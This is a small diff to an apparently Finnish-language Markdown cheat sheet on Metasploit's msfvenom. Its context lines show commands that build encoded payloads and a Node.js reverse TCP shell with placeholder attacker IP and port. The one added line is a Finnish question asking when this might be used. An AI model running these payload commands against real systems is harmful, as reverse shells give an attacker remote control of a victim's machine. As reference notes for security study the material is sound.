@@ -29,6 +29,9 @@
   - ``msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>``
 - nodejs
   - ``msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)``
+  - minulle on epäselvää, missä tilanteessa tätä voitaisiin hyödyntää?
+
+
 
 ## Lähteet
 
